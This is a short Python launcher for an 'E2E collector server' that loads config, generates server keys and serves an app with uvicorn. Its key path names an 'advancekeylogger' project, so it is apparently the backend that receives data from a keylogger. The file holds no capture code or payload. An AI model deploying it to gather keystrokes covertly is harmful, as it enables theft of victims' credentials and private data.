"""Run the E2E collector server."""
from __future__ import annotations

import argparse
from pathlib import Path
from typing import Any

import uvicorn
import yaml

from server.app import create_app
from server.keys import generate_server_keypair


def _load_config(path: str | None) -> dict[str, Any]:
    if not path:
        return {}
    config_path = Path(path).expanduser()
    if not config_path.exists():
        raise FileNotFoundError(f"Config not found: {config_path}")
    with config_path.open("r", encoding="utf-8") as handle:
        data = yaml.safe_load(handle) or {}
    return data.get("e2e_server", {})


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="E2E collector server")
    parser.add_argument("--config", type=str, default=None, help="Path to server config")
    parser.add_argument("--host", type=str, default="0.0.0.0", help="Bind host")
    parser.add_argument("--port", type=int, default=8000, help="Bind port")
    parser.add_argument(
        "--generate-keys",
        action="store_true",
        help="Generate server keys and print public key",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    config = _load_config(args.config)

    if args.generate_keys:
        key_store_path = str(config.get("key_store_path", "~/.advancekeylogger/keys/"))
        public_key = generate_server_keypair(key_store_path)
        print(public_key)
        return 0

    app = create_app(config)
    uvicorn.run(app, host=args.host, port=args.port, log_level="info")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
